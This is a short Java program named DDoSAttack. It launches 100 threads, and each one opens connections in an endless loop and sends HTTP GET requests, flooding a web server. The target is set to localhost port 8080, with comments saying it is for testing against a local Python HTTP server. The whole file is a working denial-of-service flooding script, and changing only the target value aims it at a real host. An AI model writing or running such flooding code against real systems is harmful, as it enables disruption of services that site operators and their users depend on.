import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;

public class DDoSAttack {
    public static void main(String[] args) {
        String targetIp = "localhost"; // Localhost for testing
        int targetPort = 8080; // Port used by the Python HTTP server
        int numberOfThreads = 100; // Number of concurrent threads

        for (int i = 0; i < numberOfThreads; i++) {
            new Thread(new AttackTask(targetIp, targetPort)).start();
        }
    }
}

class AttackTask implements Runnable {
    private String targetIp;
    private int targetPort;

    public AttackTask(String targetIp, int targetPort) {
        this.targetIp = targetIp;
        this.targetPort = targetPort;
    }

    @Override
    public void run() {
        try {
            InetAddress target = InetAddress.getByName(targetIp);
            while (true) {
                Socket socket = new Socket(target, targetPort);
                OutputStream out = socket.getOutputStream();
                out.write("GET / HTTP/1.1\r\n".getBytes());
                out.write(("Host: " + targetIp + "\r\n").getBytes());
                out.write("\r\n".getBytes());
                out.flush();
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
